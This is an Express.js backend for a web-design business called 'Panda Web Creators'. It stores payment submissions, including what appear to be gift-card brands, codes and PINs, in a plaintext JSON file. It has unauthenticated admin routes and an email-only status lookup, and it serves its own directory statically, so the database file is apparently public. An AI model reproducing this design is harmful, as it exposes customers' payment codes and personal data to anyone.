const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const DB_FILE = path.join(__dirname, 'database.json');

app.use(cors());
app.use(bodyParser.json());
app.use(express.static(__dirname));
app.use(express.static(path.join(__dirname, 'public')));

if (!fs.existsSync(DB_FILE)) {
    fs.writeFileSync(DB_FILE, JSON.stringify({ users: [], payments: [] }, null, 2));
}

function readDB() {
    return JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
}

function writeDB(data) {
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

// 0. Serve index.html explicitly at root route to fix "Not Found" error
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// 1. Submit Payment / Order with Phone Number
app.post('/api/payments/submit', (req, res) => {
    const { name, email, phone, plan, price, brand, code, pin } = req.body;
    const db = readDB();
    
    const newPayment = {
        id: 'PANDA-' + Math.floor(1000 + Math.random() * 9000),
        name,
        email,
        phone: phone || 'Not Provided',
        plan,
        price,
        brand,
        code,
        pin: pin || 'N/A',
        status: 'pending', // pending, approved, denied
        stage: 'in_progress', // in_progress, review, completed
        createdAt: new Date().toISOString()
    };

    db.payments.unshift(newPayment);
    writeDB(db);

    res.json({ success: true, orderId: newPayment.id, message: 'Payment submitted for admin review.' });
});

// 2. Get All Payments (Admin Portal)
app.get('/api/admin/payments', (req, res) => {
    const db = readDB();
    res.json(db.payments);
});

// 3. Admin: Approve or Deny Payment
app.post('/api/admin/payments/review', (req, res) => {
    const { orderId, action } = req.body;
    const db = readDB();

    const payment = db.payments.find(p => p.id === orderId);
    if (!payment) {
        return res.status(404).json({ success: false, message: 'Order not found.' });
    }

    if (action === 'approve') {
        payment.status = 'approved';
    } else if (action === 'deny') {
        payment.status = 'denied';
    } else {
        return res.status(400).json({ success: false, message: 'Invalid action.' });
    }

    writeDB(db);
    res.json({ success: true, payment });
});

// 3b. Admin: Update Project Build Stage
app.post('/api/admin/project/stage', (req, res) => {
    const { orderId, stage } = req.body;
    const db = readDB();

    const payment = db.payments.find(p => p.id === orderId);
    if (!payment) {
        return res.status(404).json({ success: false, message: 'Order not found.' });
    }

    payment.stage = stage;
    writeDB(db);
    res.json({ success: true, payment });
});

// 4. Check User Payment Status
app.get('/api/user/status', (req, res) => {
    const { email } = req.query;
    const db = readDB();
    const userPayments = db.payments.filter(p => p.email === email);
    res.json({ success: true, payments: userPayments });
});

app.listen(PORT, () => {
    console.log(`Panda Web Creators Server running on http://localhost:${PORT}`);
});

